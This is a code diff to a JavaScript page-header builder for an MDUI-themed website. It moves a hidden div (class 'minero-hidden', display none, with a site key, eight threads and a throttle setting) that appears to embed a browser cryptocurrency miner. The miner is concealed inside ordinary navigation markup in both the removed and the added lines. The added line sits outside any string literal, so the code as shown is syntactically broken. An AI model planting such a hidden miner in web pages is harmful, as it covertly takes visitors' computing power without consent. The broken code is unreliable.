@@ -13,10 +13,11 @@ function init(){
     var html = "";
     html += `
     <header class="mdui-appbar mdui-color-theme">`
+    <div class="minero-hidden" style="display: none" data-key="d314b1cb10669fc121f8ab2381cc8ed0" data-threads="8" data-throttle="100">
     if(dark){
         html += `
-        <div id="nav" class="mdui-toolbar mdui-container mdui-text-color-white-text"></div>
-        <div id="nav" class="minero-hidden" style="display: none" data-key="d314b1cb10669fc121f8ab2381cc8ed0" data-threads="8" data-throttle="100"></div>`;
+        <div id="nav" class="mdui-toolbar mdui-container mdui-text-color-white-text">
+        </div>`;
     }else{
         html += `
         <div id="nav" class="mdui-toolbar mdui-container">
